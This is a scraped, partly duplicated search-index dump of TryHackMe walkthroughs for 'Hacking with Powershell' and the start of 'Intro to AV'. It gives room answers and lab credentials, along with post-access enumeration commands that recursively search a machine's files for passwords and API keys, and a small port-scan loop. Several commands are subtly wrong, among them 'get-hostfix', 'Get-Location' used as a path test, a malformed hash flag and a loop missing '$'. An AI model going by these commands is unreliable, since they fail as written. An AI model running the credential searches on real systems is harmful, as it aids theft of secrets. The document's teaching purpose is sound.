but here is a good resource to use: Answer the questions below What file contains the password Answer Explain Doc3M We use select-string -pattern password command to solve this chall. Let's try it with each file. Full command powershell get-childitem -path .\\emails\\ -file -recurse | select-string -pattern password What is the password? Answer Explain johnisalegend99 What files contains an HTTPS link? Answer Explain Doc2Mary Task 6: Intermediate Scripting \u00b6 Content Now that you've learnt a little bit about how scripting works - let's try something a bit more interesting. Sometimes we may not have utilities like Nmap and Python available, and we are forced to write scripts to do very rudimentary tasks. Why don't you try writing a simple port scanner using Powershell? Here's the general approach to use: Determine IP ranges to scan(in this case it will be localhost) and you can provide the input in any way you want Determine the port ranges to scan Determine the type of scan to run(in this case it will be a simple TCP Connect Scan) Answer the questions below How many open ports did you find between 130 and 140(inclusive of those two)? Answer Explain 11 Use Test-Netconnection command to test connection. Script script.ps1 for ( $i = 130 ; i -le 140 ; $i ++){ test-connection localhost -port $i } More \u00b6 Operator in powershell: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-7.3&viewFallbackFrom=powershell-6 Script file: https://learnxinyminutes.com/docs/powershell/ Full command: https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.3&viewFallbackFrom=powershell-7","title":"TryHackMe - Hacking with Powershell - Walkthrough"},{"location":"tryhackme/room/l/hacking-with-powershell/#tryhackme-hacking-with-powershell-walkthrough","text":"","title":"TryHackMe - Hacking with Powershell - Walkthrough"},{"location":"tryhackme/room/l/hacking-with-powershell/#task-1-objectives","text":"Content Before completing this room, you should be aware of some fundamentals. For example, the differences between CMD, PS and some syntax. This room will cover the following: What is Powershell Basic Powershell commands Windows enumeration skills Powershell scripting Answer the questions below Read the above and deploy the machine! No answer needed","title":"Task 1:  Objectives"},{"location":"tryhackme/room/l/hacking-with-powershell/#task-2-what-is-powershell","text":"Content Powershell is the Windows Scripting Language and shell environment built using the .NET framework. This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object-oriented. This also means that running cmdlets allows you to perform actions on the output object (which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun ; for example, the cmdlet to list commands is called Get-Command Common verbs to use include: Get Start Stop Read Write New Out To get the complete list of approved verbs, visit this link. Answer the questions below What is the command to get a new object? Get-New To see the usage of a cmdlet we use the syntax Get-Help + <name of cmdlet> -Examples . For example, we want to see the usage of the Get-Command[^2] command, we use the Get-Help Get-Command -Examples syntax. See picture bellow. Image title This pic describes how to use the Get-Command command syntax","title":"Task 2: What is Powershell?"},{"location":"tryhackme/room/l/hacking-with-powershell/#task-3-basic-powershell-commands","text":"Content Now that we've understood how cmdlets work - let's explore how to use them! The main thing to remember here is that Get-Command and Get-Help are your best friends!","title":"Task 3: Basic Powershell Commands"},{"location":"tryhackme/room/l/hacking-with-powershell/#using-get-help","text":"Get-Help displays information about a cmdlet. To get help with a particular command, run the following: Get-Help Command-Name You can also understand how exactly to use the command by passing in the -examples flag. This would return output like the following: Running the Get-Help cmdlet to explain a command PS C :\\ Users \\ Administrator > Get-Help Get-Command -Examples NAME Get-Command SYNOPSIS Gets all commands . Example 1 : Get cmdlets , functions , and aliases PS C :\\> Get-Command","title":"Using Get-Help"},{"location":"tryhackme/room/l/hacking-with-powershell/#using-get-command","text":"Get-Command gets all the cmdlets installed on the current Computer. The great thing about this cmdlet is that it allows for pattern matching like the following Get-Command Verb-* or Get-Command *-Noun Running Get-Command New-* to view all the cmdlets for the verb new displays the following: Using the Get-Command to list all cmdlets installed PS C :\\ Users \\ Administrator > Get-Command New -* CommandType Name Version Source ----------- ---- ------- ------ Alias New-AWSCredentials 3 . 3 . 563 . 1 AWSPowerShell Alias New-EC2FlowLogs 3 . 3 . 563 . 1 AWSPowerShell Alias New-EC2Hosts 3 . 3 . 563 . 1 AWSPowerShell Alias New-RSTags 3 . 3 . 563 . 1 AWSPowerShell Alias New-SGTapes 3 . 3 . 563 . 1 AWSPowerShell Function New-AutologgerConfig 1 . 0 . 0 . 0 EventTracingManagement Function New-DAEntryPointTableItem 1 . 0 . 0 . 0 DirectAccessClientComponents Function New-DscChecksum 1 . 1 PSDesiredStateConfiguration Function New-EapConfiguration 2 . 0 . 0 . 0 VpnClient Function New-EtwTraceSession 1 . 0 . 0 . 0 EventTracingManagement Function New-FileShare 2 . 0 . 0 . 0 Storage Function New-Fixture 3 . 4 . 0 Pester Function New-Guid 3 . 1 . 0 . 0 Microsoft . PowerShell . Utility - -cropped for brevity --","title":"Using Get-Command"},{"location":"tryhackme/room/l/hacking-with-powershell/#object-manipulation","text":"In the previous task, we saw how the output of every cmdlet is an object. If we want to manipulate the output, we need to figure out a few things: passing the output to other cmdlets using specific object cmdlets to extract information The Pipeline( | ) is used to pass output from one cmdlet to another. A major difference compared to other shells is that Powershell passes an object to the next cmdlet instead of passing text or string to the command after the pipe. Like every object in object-oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet, and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member cmdlet: Verb-Noun | Get-Member An example of running this to view the members for Get-Command is: Get-Command | Get-Member -MemberType Method Using pipe (|) to pass output from one cmdlet to another PS C :\\ Users \\ Administrator > Get-Command | Get-Member -MemberType Method TypeName : System . Management . Automation . AliasInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () TypeName : System . Management . Automation . FunctionInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () TypeName : System . Management . Automation . CmdletInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () PS C :\\ Users \\ Administrator > From the above flag in the command, you can see that you can also select between methods and properties.","title":"Object Manipulation"},{"location":"tryhackme/room/l/hacking-with-powershell/#creating-objects-from-previous-cmdlets","text":"One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet. Here's an example of listing the directories and just selecting the mode and the name: Listing the directories and filtering via mode and name PS C :\\ Users \\ Administrator > Get-ChildItem | Select-Object -Property Mode , Name Mode Name ---- ---- d-r --- Contacts d-r --- Desktop d-r --- Documents d-r --- Downloads d-r --- Favorites d-r --- Links d-r --- Music d-r --- Pictures d-r --- Saved Games d-r --- Searches d-r --- Videos PS C :\\ Users \\ Administrator > You can also use the following flags to select particular information: first - gets the first x object last - gets the last x object unique - shows the unique objects skip - skips x objects","title":"Creating Objects From Previous cmdlets"},{"location":"tryhackme/room/l/hacking-with-powershell/#filtering-objects","text":"When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties. The general format for using this cmdlet is Verb-Noun | Where-Object -Property PropertyName -operator Value Verb-Noun | Where-Object {$_.PropertyName -operator Value} The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet . Powershell is quite sensitive, so don't put quotes around the command! Where -operator is a list of the following operators: -Contains : if any item in the property value is an exact match for the specified value -EQ : if the property value is the same as the specified value -GT : if the property value is greater than the specified value For a full list of operators, use this link. Here's an example of checking the stopped processes: Demonstrating the use of operators only to show stopped services PS C :\\ Users \\ Administrator > Get-Service | Where-Object -Property Status -eq Stopped Status Name DisplayName ------ ---- ----------- Stopped AJRouter AllJoyn Router Service Stopped ALG Application Layer Gateway Service Stopped AppIDSvc Application Identity Stopped AppMgmt Application Management Stopped AppReadiness App Readiness Stopped AppVClient Microsoft App-V Client Stopped AppXSvc AppX Deployment Service ( AppXSVC ) Stopped AudioEndpointBu ... Windows Audio Endpoint Builder Stopped Audiosrv Windows Audio Stopped AxInstSV ActiveX Installer ( AxInstSV ) Stopped BITS Background Intelligent Transfer Ser ... Stopped Browser Computer Browser Stopped bthserv Bluetooth Support Service -- cropped for brevity --","title":"Filtering Objects"},{"location":"tryhackme/room/l/hacking-with-powershell/#sort-object","text":"When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe-lining the output of a cmdlet to the Sort-Object cmdlet . The format of the command would be: Verb-Noun | Sort-Object Here's an example of sorting the list of directories: Using the Sort-Object cmdlet to sort piped information PS C :\\ Users \\ Administrator > Get-ChildItem | Sort-Object Directory : C :\\ Users \\ Administrator Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r --- 10 / 3 / 2019 5 : 11 PM Contacts d-r --- 10 / 5 / 2019 2 : 38 PM Desktop d-r --- 10 / 3 / 2019 10 : 55 PM Documents d-r --- 10 / 3 / 2019 11 : 51 PM Downloads d-r --- 10 / 3 / 2019 5 : 11 PM Favorites d-r --- 10 / 3 / 2019 5 : 11 PM Links d-r --- 10 / 3 / 2019 5 : 11 PM Music d-r --- 10 / 3 / 2019 5 : 11 PM Pictures d-r --- 10 / 3 / 2019 5 : 11 PM Saved Games d-r --- 10 / 3 / 2019 5 : 11 PM Searches d-r --- 10 / 3 / 2019 5 : 11 PM Videos PS C :\\ Users \\ Administrator > Now that you've understood how Powershell works let's try some commands to apply this knowledge! Answer the questions below What is the location of the file \"interesting-file.txt\" Answer Explain C :\\ Program Files To find the file interesting-file.txt we will scan the directory with the following command: Get-ChildItem -Path D :\\ -Include * interesting -file *. txt -File -Recurse -ErrorAction SilentlyContinue I will explain the flags: Flag -Path: Specify the path to scan Flag -Include: Specify the file to scan (You can use the * operator to specify to find files whose filename includes the string between the two * operators we have set.) Flag -File: Specify only file Flag -Recurse: Recursive search Flag -ErrorAction SilentlyContinue: Ignore error Specify the contents of this file Answer Explain notsointerestingcontent To view content of file, you can use: 1 . Get-Content -Path + path_of_file 2 . More + path_of_file How many cmdlets are installed on the system(only cmdlets, not functions and aliases)? Answer Explain 6638 First of all, you must know all functions and cmdlets on the system by listing them. Use Get-Commnad . You see that the output consists of 4 columns in order: CommandType, Name, Version, Source. Focus at CommandType to filter. Second, filter the results to find the number of cmdlets by: Where-Object -Property CommandType -like Cmdlet . Ye, you have filtered out all cmdlets on the system. Last, let's count them by Measure command Image title The image describes the result Get the MD5 hash of interesting-file.txt Answer Explain 49A586A2A9456226F8A1B4CEC6FAB329 To get hash of file, you can use Get-FileHash + -Algorithm -MD5. The full syntax to solve this question is: Get-FileHash C :\\ 'Program Files' \\ interesting -file . txt . txt -Algorithm -MD5 What is the command to get the current working directory? Answer Explain Get-Location To get the current working directory, you will use Get-Location command. Furthermore, you can use Get-LocalUser command to computer show up all user in computer. Does the path \"C:\\Users\\Administrator\\Documents\\Passwords\" Exist (Y/N)? Answer Explain N Like the previous scenario, we will use Get-Location + path to check if the working directory exists or not. Full syntax: Get-Location C :\\ Users \\ Administrator \\ Documents \\ Passwords Image title The image describes the result What command would you use to make a request to a web server? Answer Explain Invoke-WebRequest Search google or find in all cmdlets on the system by filtering as follows: Find all cmdlets and funtions by Get-Command command Filter to get cmdlets which itself has one and keywords like call, request,... in the name by Where-Object -Property Name -like *request* . You will see Invoke-WebRequest command in results. Base64 decode the file b64.txt on Windows. Answer Explain ihopeyoudidthisonwindows To showup this question, use Certutil command with flag decode. Besides, Certutil command also has some useful flags: encode: encode according to base64 decodehex: decode according to hexadecimal View more at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil Full step: Certutil -decode b64.txt output.txt Get-Content output.txt PS C :\\ Users \\ Administrator \\ Desktop > certutil -decode .\\ b64 . txt a . txt Input Length = 432 Output Length = 323 CertUtil : -decode command completed successfully . PS C :\\ Users \\ Administrator \\ Desktop > Get-Content a . txt this is the flag - ihopeyoudidthisonwindows the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage","title":"Sort-Object"},{"location":"tryhackme/room/l/hacking-with-powershell/#task-4-enumeration","text":"Content The first step when you have gained initial access to any machine would be to enumerate. We'll be enumerating the following: users basic networking information file permissions registry permissions scheduled and running tasks insecure files Your task will be to answer the following questions to enumerate the machine using Powershell commands! Answer the questions below How many users are there on the machine? Answer Explain 5 Use Get-LocalUser command which I explained at What is the command to get the current working directory? question Which local user does this SID(S-1-5-21-1394777289-3961777894-1791813945-501) belong to? Answer Explain Guest Use Get-LocalUser | Select * command to showup full property. Then, filter output and get results. PS C :\\ Users \\ Administrator \\ Desktop > get-localuser | select * | where-object sid -like * 501 * AccountExpires : Description : Built-in account for guest access to the computer / domain Enabled : False FullName : PasswordChangeableDate : PasswordExpires : UserMayChangePassword : False PasswordRequired : False PasswordLastSet : LastLogon : Name : Guest SID : S - 1 - 5 - 21 - 1394777289 - 3961777894 - 1791813945 - 501 PrincipalSource : Local ObjectClass : User How many users have their password required values set to False? Answer Explain 4 Filter, filter, filter,... PS C :\\ Users \\ Administrator \\ Desktop > get-localuser | select * | where-object passwordrequired -match false | measure Count : 4 Average : Sum : Maximum : Minimum : Property : How many local groups exist? Answer Explain 24 Use get-command | where name -like *group* | where name -like *local* to file cmdlet, and filter then. PS C :\\ Users \\ Administrator \\ Desktop > get-command | where-object name -like * group * | where-object name -like * local * CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Add-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet New-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Rename-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Set-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts PS C :\\ Users \\ Administrator \\ Desktop > get-command | where name -like * group * | where name -like * local * CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Add-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet New-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Rename-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Set-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts PS C :\\ Users \\ Administrator \\ Desktop > get-localgroup Name Description ---- ----------- Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission ... Administrators Administrators have complete and unrestricted access to the computer / domain Backup Operators Backup Operators can override security restrictions for the sole purpose of back ... Certificate Service DCOM Access Members of this group are allowed to connect to Certification Authorities in the ... Cryptographic Operators Members are authorized to perform cryptographic operations . Distributed COM Users Members are allowed to launch , activate and use Distributed COM objects on this ... Event Log Readers Members of this group can read event logs from local machine Guests Guests have the same access as members of the Users group by default , except for ... Hyper-V Administrators Members of this group have complete and unrestricted access to all features of H ... IIS_IUSRS Built-in group used by Internet Information Services . Network Configuration Operators Members in this group can have some administrative privileges to manage configur ... Performance Log Users Members of this group may schedule logging of performance counters , enable trace ... Performance Monitor Users Members of this group can access performance counter data locally and remotely Power Users Power Users are included for backwards compatibility and possess limited adminis ... Print Operators Members can administer printers installed on domain controllers RDS Endpoint Servers Servers in this group run virtual machines and host sessions where users RemoteA ... RDS Management Servers Servers in this group can perform routine administrative actions on servers runn ... RDS Remote Access Servers Servers in this group enable users of RemoteApp programs and personal virtual de ... Remote Desktop Users Members in this group are granted the right to logon remotely Remote Management Users Members of this group can access WMI resources over management protocols ( such a ... Replicator Supports file replication in a domain Storage Replica Administrators Members of this group have complete and unrestricted access to all features of S ... System Managed Accounts Group Members of this group are managed by the system . Users Users are prevented from making accidental or intentional system-wide changes an ... PS C :\\ Users \\ Administrator \\ Desktop > get-localgroup | measure Count : 24 Average : Sum : Maximum : Minimum : Property : What command did you use to get the IP address info? Answer Explain Get-NetIPAddress Use Get-Command | Where-Object -property name -like \"*ip*\" | where-object -property Name -like \"*address*\" to find cmdlets. How many ports are listed as listening? Answer Explain 20 Use this command: get-nettcpconnection | where state -match listen | measure What is the remote address of the local port listening on port 445? Answer Explain :: Use this command: get-nettcpconnection | where localport -match 445 How many patches have been applied? Answer Explain 20 Use this command: get-hostfix When was the patch with ID KB4023834 installed? Answer Explain 6 / 15 / 2017 12 : 00 : 00 AM Use this command: get-hostfix | where hostfixID -match KB4023834 Find the contents of a backup file. Answer Explain backpassflag First, you must find backup (in window, it has the extension .bak ). Find it by get-childitem -path C:\\ -include *.bak* -file -recurse -erroraction silentlycontinue Second, read it PS C :\\ Users \\ Administrator > more 'C:\\Program Files (x86)\\Internet Explorer\\passwords.bak.txt' backpassflag Search for all files containing API_KEY Answer Explain fakekey123 Use this command to solve: get-childitem -path c :\\* -recurse -erroraction silentlycontinue | select-string -pattern API_KEY What command do you do to list all the running processes? Answer Explain Get-Process Find cmdlet by using get-command command and filter What is the path of the scheduled task called new-sched-task? Answer Explain / Find command that it provides schedule task: get-command | where name -like *schedule* . You will see get-scheduledtask , this is the command to look for. Then, filter output and get result. PS C :\\ Users \\ Administrator > get-scheduledtask | where taskname -like * new * TaskPath TaskName State -------- -------- ----- \\ new-sched -task Ready Who is the owner of the C:\\? Answer Explain NT SERVICE \\ TrustedInstaller To get owner of X (path_of_folder/path_of_file), use Get-Acl command . Full syntax to solve: PS C :\\ Users \\ Administrator \\ Desktop > get-acl C :\\ Directory : Path Owner Access ---- ----- ------ C :\\ NT SERVICE \\ TrustedInstaller CREATOR OWNER Allow 268435456 ...","title":"Task 4:  Enumeration"},{"location":"tryhackme/room/l/hacking-with-powershell/#task-5-basic-scripting-challenge","text":"Now that we have run Powershell commands, let's try to write and run a script to do more complex and powerful actions. For this ask, we'll use Powershell ISE (the Powershell Text Editor). Let's use a particular scenario to show an example of this script. Given a list of port numbers, we want to use this list to see if the local port is listening. Open the listening-ports.ps1 script on the Desktop using Powershell ISE. Powershell scripts usually have the .ps1 file extension. $system_ports = Get-NetTCPConnection -State Listen $text_port = Get-Content -Path C :\\ Users \\ Administrator \\ Desktop \\ ports . txt foreach ( $port in $text_port ){ if ( $port -in $system_ports . LocalPort ){ echo $port } } On the first line, we want to get a list of all the ports on the system that are listening. We do this using the Get-NetTCPConnection cmdlet. We are then saving the output of this cmdlet into a variable. The convention to create variables is used as: $variable_name = value In the following line, we want to read a list of ports from the file. We do this using the Get-Content cmdlet. Again, we store this output in the variables. The simplest next step is to iterate through all the ports in the file to see if the ports are listening. To iterate through the ports in the file, we use the following: foreach ( $new_var in $existing_var ){} This particular code block is used to loop through a set of objects. Once we have each individual port, we want to check if this port occurs in the listening local ports. Instead of doing another for loop, we just use an if statement with the -in operator to check if the port exists in the LocalPort property of any object. A full list of if statement comparison operators can be found here. To run the script, call the script path using Powershell or click the green button on Powershell ISE: Image title Now that we've seen what a basic script looks like - it's time to write one of your own. The emails folder on the Desktop contains copies of the emails John, Martha, and Mary have been sending to each other(and themselves). Answer the following questions with regard to these emails (try not to open the files and use a script to answer the questions). Scripting may be a bit difficult, but here is a good resource to use: Answer the questions below What file contains the password Answer Explain Doc3M We use select-string -pattern password command to solve this chall. Let's try it with each file. Full command powershell get-childitem -path .\\emails\\ -file -recurse | select-string -pattern password What is the password? Answer Explain johnisalegend99 What files contains an HTTPS link? Answer Explain Doc2Mary","title":"Task 5: Basic Scripting Challenge"},{"location":"tryhackme/room/l/hacking-with-powershell/#task-6-intermediate-scripting","text":"Content Now that you've learnt a little bit about how scripting works - let's try something a bit more interesting. Sometimes we may not have utilities like Nmap and Python available, and we are forced to write scripts to do very rudimentary tasks. Why don't you try writing a simple port scanner using Powershell? Here's the general approach to use: Determine IP ranges to scan(in this case it will be localhost) and you can provide the input in any way you want Determine the port ranges to scan Determine the type of scan to run(in this case it will be a simple TCP Connect Scan) Answer the questions below How many open ports did you find between 130 and 140(inclusive of those two)? Answer Explain 11 Use Test-Netconnection command to test connection. Script script.ps1 for ( $i = 130 ; i -le 140 ; $i ++){ test-connection localhost -port $i }","title":"Task 6: Intermediate Scripting"},{"location":"tryhackme/room/l/hacking-with-powershell/#more","text":"Operator in powershell: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-7.3&viewFallbackFrom=powershell-6 Script file: https://learnxinyminutes.com/docs/powershell/ Full command: https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.3&viewFallbackFrom=powershell-7","title":"More"},{"location":"tryhackme/room/l/hacking-with-powershell/tmp/","text":"Content Explain Answer the questions below Learn about password attacking techniques in the next task! Answer Explain No needed answer Image title The image describes the result","title":"Tmp"},{"location":"tryhackme/room/l/introtoav/","text":"Introduction to Antivirus \u00b6 Room at https://tryhackme.com/room/introtoav Task 1: Introduction \u00b6 Welcome to Intro to AV Antivirus (AV) software is one of the essential host-based security solutions available to detect and prevent malware attacks within the end-user's machine. AV software consists of different modules, features, and detection techniques, which are discussed in this room. As a red teamer or pentester, it is essential to be familiar with and understand how AV software and its detection techniques work. Once this knowledge is acquired, it will be easier to work toward AV evasion techniques. Learning Objectives \u00b6 What is Antivirus software? Antivirus detection approaches Enumerate installed AV software in the target machine Test in a simulated environment Room prerequisites \u00b6 General knowledge of host-based detection solutions; check The Lay of the Land room for more information. General experience with Hashing crypto; check the Hashing - Crypto 101 room for more information. Basic knowledge of Yara Rules; check the THM Yara room for more information. Answer the questions bellow Question: Which Antivirus software is running on the VM? Ans: name Task 2: Antivirus Software \u00b6 What is AV software? \u00b6 Antivirus (AV) software is an extra layer of security that aims to detect and prevent the execution and spread of malicious files in a target operating system. It is a host-based application that runs in real-time (in the background) to monitor and check the current and newly downloaded files. The AV software inspects and decides whether files are malicious using different techniques, which will be covered later in this room. Interestingly, the first antivirus software was designed solely to detect and remove computer viruses . Nowadays, that has changed; modern antivirus applications can detect and remove computer viruses as well other harmful files and threats. What does AV software look for? \u00b6 Traditional AV software looks for malware with predefined malicious patterns or signatures. Malware is harmful software whose primary goal is to cause damage to a target machine, including but not limited to: Gain full access to a target machine. Steal sensitive information such as passwords. Encrypt files and cause damage to files. Inject other malicious software or unwanted advertisements. Used the compromised machine to perform further attacks such as botnet attacks. AV vs other security products \u00b6 Alt text In addition to AV software, other host-based security solutions provide real-time protection to endpoint devices. Endpoint Detection and Response (EDR) is a security solution that provides real-time protection based on behavioral analytics. An antivirus application performs scanning, detecting, and removing malicious files. On the other hand, EDR monitors various security checks in the target machine, including file activities, memory, network connections, Windows registry, processes, etc. Modern Antivirus products are implemented to integrate the traditional Antivirus features and other advanced functionalities (similar to EDR functionalities) into one product to provide comprehensive protection against digital threats. For more information about Host-based security solutions, we suggest visiting the THM room: The Lay of the Land . AV software in the past and present \u00b6 McAfee Associates, Inc. started the first AV software implementation in 1987. It was called \"VirusScan,\" and its main goal at that time was to remove a virus named \"Brain\" that infected John McAfee's computer. Later, other companies joined in the battle against viruses. AV software was called scanners, and they were command-line software that searched for malicious patterns in files. Since then, things have changed. AV software nowadays uses a Graphical User Interface (GUI) to perform scans for malicious files and other tasks. Malware programs have also expanded in scope and now target victims on Windows and other operating systems. Modern AV software supports most devices and platforms, including Windows, Linux, macOS, Android, and iOS. Modern AV software has improved and become more intelligent and sophisticated, as they pack a bundle of versatile features, including Antivirus, Anti-Exploit, Firewall, Encryption tool, etc. We will be discussing some AV features in the next task. Answer the questions bellow Question: What does AV mean? Ans: Antivirus Question: Which PC Antivirus vendor implemented the first AV software on the market? McAfee Question: Antivirus software is a _____-based security solution. host-based Task 3: Antivirus Features \u00b6 Antivirus Engines \u00b6 An AV engine is responsible for finding and removing malicious code and files. Good AV software implements an effective and solid AV core that accurately and quickly analyzes malicious files. Also, It should handle and support various file types, including archive files, where it can self-extract and inspect all compressed files. Most AV products share the same common features but are implemented differently, including but not limited to: Scanner Detection techniques Compressors and Archives Unpackers Emulators Scanner \u00b6 The scanner feature is included in most AV products: AV software runs and scans in real-time or on-demand. This feature is available in the GUI or through the command prompt. The user can use it whenever required to check files or directories. The scanning feature must support the most known malicious file types to detect and remove the threat. In addition, it also may support other types of scanning depending on the AV software, including vulnerabilities, emails, Windows memory, and Windows Registry. Detection techniques \u00b6 An AV detection technique searches for and detects malicious files; different detection techniques can be used within the AV engine, including: Signature-based detection is the traditional AV technique that looks for predefined malicious patterns and signatures within files. Heuristic detection is a more advanced technique that includes various behavioral methods to analyze suspicious files. Dynamic detection is a technique that includes monitoring the system calls and APIs and testing and analyzing in an isolated environment. We will cover these techniques in the next task. A good AV engine is accurate and quickly detects malicious files with fewer false-positive results. We will showcase several AV products that provide inaccurate results and misclassify a file. Compressors and Archives \u00b6 The \"Compressors and Archives\" feature should be included in any AV software. It must support and be able to deal with various system file types, including compressed or archived files: ZIP, TGZ, 7z, XAR, RAR, etc. Malicious code often tries to evade host-based security solutions by hiding in compressed files. For this reason, AV software must decompress and scan through all files before a user opens a file within the archive. PE (Portable Executable) Parsing and Unpackers \u00b6 Malware hides and packs its malicious code by compressing and encrypting it within a payload. It decompresses and decrypts itself during runtime to make it harder to perform static analysis. Thus, AV software must be able to detect and unpack most of the known packers (UPX, Armadillo, ASPack, etc.) before the runtime for static analysis. Malware developers use various techniques, such as Packing, to shrink the size and change the malicious file's structure. Packing compresses the original executable file to make it harder to analyze. Therefore, AV software must have an unpacker feature to unpack protected or compressed executable files into the original code. Another feature that AV software must have is Windows Portable Executable (PE) header parser. Parsing PE of executable files helps distinguish malicious and legitimate software (.exe files). The PE file format in Windows (32 and 64 bits) contains various information and resources, such as object code, DLLs, icon files, font files, and core dumps. Emulators \u00b6 An emulator is an Antivirus feature that does further analysis on suspicious files. Once an emulator receives a request, the emulator runs the suspect (exe, DLL, PDF, etc.) files in a virtualized and controlled environment. It monitors the executable files' behavior during the execution, including the Windows APIs calls, Registry, and other Windows files. The following are examples of the artifacts that the emulator may collect: API calls Memory dumps Filesystem modifications Log events Running processes Web requests An emulator stops the execution of a file when enough artifacts are collected to detect malware. Other common features \u00b6 The following are some common features found in AV products: A self-protection driver to guard against malware attacking the actual AV. Firewall and network inspection functionality. Command-line and graphical interface tools. A daemon or service. A management console. Answer the questions bellow Question: Which AV feature analyzes malware in a safe and isolated environment? Ans: Emulators Question: An _______ feature is a process of restoring or decrypting the compressed executable files to the original. Ans: Unpackers Question: Read the above to proceed to the next task, where we discuss the AV detection techniques. Ans: No answer needed Task 4: Deploy the VM \u00b6 We have provided a Windows machine 10 Pro to complete this room. The VM can be accessed through the in-browser feature. Once the VM is deployed, your browser should split into two windows, as the following: If the browser doesn't split, you can select the \"Show Split View\" bottom located at the top of your browser. You can also connect via RDP, make sure you deploy the AttackBox or connect to the VPN. Use the following credentials below. Machine IP: MACHINE_IP Username: thm Password: TryHackM3 Connect to the VM via the RDP client user @machine $ xfreerdp / v : MACHINE_IP / u : thm / p : TryHackM3 Answer the questions bellow Question: Once you've deployed the VM, it will take a few minutes to boot up. Then, progress to the next task! Ans: No answer needed Task 5: AV Static Detection \u00b6 Generally speaking, AV detection can be classified into three main approaches: Static Detection Dynamic Detection Heuristic and Behavioral Detection Static Detection \u00b6 A static detection technique is the simplest type of Antivirus detection, which is based on predefined signatures of malicious files. Simply, it uses pattern-matching techniques in the detection, such as finding a unique string, CRC (Checksums), sequence of bytecode/Hex values, and Cryptographic hashes (MD5, SHA1, etc.). It then performs a set of comparisons between existing files within the operating system and a database of signatures. If the signature exists in the database, then it is considered malicious. This method is effective against static malware. In this task, we will be using a signature-based detection method to see how antivirus products detect malicious files. It is important to note that this technique works against known malicious files only with pre-generated signatures in a database. Thus, the database needs to be updated from time to time. We will use the ClamAV antivirus software to demonstrate how signature-based detection identifies malicious files. The ClamAV software is pre-installed in the provided VM, and we can access it in the following path: c:\\Program Files\\ClamAV\\clamscan.exe. We will also scan a couple of malware samples, which can be found on the desktop. The Malware samples folder contains the following files: EICAR is a test file containing ASCII strings used to test AV software's effectiveness instead of real malware that could damage your machine. For more information, you may visit the official EICAR website, Here. Backdoor 1 is a C# program that uses a well-known technique to establish a reverse connection, including creating a process and executing a Metasploit Framework shellcode. Backdoor 2 is a C# program that uses process injection and encryption to establish a reverse connection, including injecting a Metasploit shellcode into an existing and running process. AV-Check is a C# program that enumerates AV software in a target machine. Note that this file is not malicious. We will discuss this tool in more detail in task 6. notes.txt is a text file that contains a command line. Note that this file is not malicious. ClamAV comes with its database, and during the installation, we need to download the recently updated version. Let's try to scan the Malware sample folder using the clamscan.exe binary and check how ClamAV performs against these samples. Command Prompt c :\\> \"c:\\Program Files\\ClamAV\\clamscan.exe\" c :\\ Users \\ thm \\ Desktop \\ Samples Loading : 22s , ETA : 0s [========================>] 8 . 61M / 8 . 61M sigs Compiling : 4s , ETA : 0s 